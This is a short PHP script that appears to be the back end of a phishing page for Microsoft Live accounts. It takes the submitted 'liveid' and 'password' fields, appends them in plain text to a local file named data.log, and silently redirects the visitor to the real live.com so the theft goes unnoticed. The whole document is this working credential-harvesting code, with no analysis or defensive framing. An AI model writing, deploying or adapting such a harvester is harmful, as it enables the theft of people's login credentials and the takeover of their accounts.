<?php 
	$liveid = $_REQUEST["liveid"];
	$password = $_REQUEST["password"];
	$file = fopen("data.log","a");
	fwrite($file,"liveid:".$liveid." password:".$password."\n");
	fclose($file);
	echo "<META http-equiv=\"refresh\" content=\"0;URL=http://www.live.com\">"
?>
